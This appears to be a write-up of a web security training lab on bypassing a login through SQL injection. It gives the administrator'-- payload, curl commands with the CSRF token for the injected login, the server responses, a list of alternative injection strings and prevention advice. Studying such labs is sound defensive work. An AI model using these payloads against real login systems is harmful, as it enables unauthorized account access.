# SQL Injection - Authentication Bypass

## Lab Description
This lab contains a SQL injection vulnerability in the login function. The goal is to bypass authentication and log in as the `administrator` user without knowing the password.

**Difficulty**: Apprentice  
**Lab URL**: https://0acc002703ba80758571d5c9001e0084.web-security-academy.net/

## Vulnerability Analysis

### Typical Login Query
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
```

The application checks if both username and password match. If we can manipulate the query to always return true or ignore the password check, we can bypass authentication.

### Injection Point
The `username` field in the login form is vulnerable to SQL injection.

## Exploitation

### Step 1: Understand the Attack
We'll inject a SQL comment (`--`) to comment out the password check, making the query only verify the username.

**Payload**: `administrator'--`

This transforms the query to:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'xxx'
```

Everything after `--` is commented out, so the password check is ignored.

### Step 2: Login Form Analysis

**Request to login page**:
```bash
curl -s "https://[lab-url]/login"
```

**Response** (truncated):
```html
<form class=login-form method=POST action="/login">
    <input required type="hidden" name="csrf" value="fRF9AM700o8FCsV3rdCnBD9BTGMYEGp5">
    <input required type=username name="username" autofocus>
    <input required type=password name="password">
</form>
```

### Step 3: Execute the Attack

**Method 1: Browser**
1. Navigate to the login page
2. Enter username: `administrator'--`
3. Enter any password (it will be ignored)
4. Click "Log in"

**Method 2: curl**
```bash
# Get CSRF token
curl -s "https://[lab-url]/login" -c cookies.txt | grep csrf | grep -oP 'value="\K[^"]+'

# Login with SQL injection
curl -i "https://[lab-url]/login" \
  -b cookies.txt \
  -d "csrf=<CSRF_TOKEN>&username=administrator'--&password=anything" \
  -L
```

**Response** (truncated):
```http
HTTP/2 302 
location: /my-account?id=administrator
set-cookie: session=JfIi8YXVAI99AGEUzpNBsyoylWjP7CHr; Secure; HttpOnly; SameSite=None

HTTP/2 200 
content-type: text/html; charset=utf-8

<p>Your username is: administrator</p>
```

### Step 4: Verify Success
After successful login, you'll be redirected to `/my-account?id=administrator` and see:
```html
<p>Your username is: administrator</p>
```

The lab will automatically mark as solved.

## Key Concepts

1. **SQL Comments**: 
   - `--` (SQL standard - requires space after)
   - `#` (MySQL)
   - `/* */` (Multi-line comment)

2. **Authentication Bypass**: By commenting out the password check, we only need a valid username

3. **Always True Conditions**: Alternative approach using `' OR '1'='1'--`

## Alternative Payloads

```sql
administrator'--
admin' OR '1'='1'--
admin' OR 1=1--
' OR '1'='1'--
administrator'#
administrator'/*
```

**Note**: When using `--`, you need a space after it in SQL. In URLs, this is represented as `--+` or `--%20`.

## Prevention

- **Use Parameterized Queries**: Never concatenate user input into SQL
  ```python
  # Bad
  query = f"SELECT * FROM users WHERE username = '{username}'"
  
  # Good
  query = "SELECT * FROM users WHERE username = ?"
  cursor.execute(query, (username,))
  ```
- **Implement proper input validation**
- **Use ORM frameworks** (e.g., SQLAlchemy, Hibernate)
- **Apply least privilege** for database accounts
- **Add additional authentication layers** (MFA, rate limiting)

## Lab Completion
Once logged in as administrator, the lab is automatically solved.
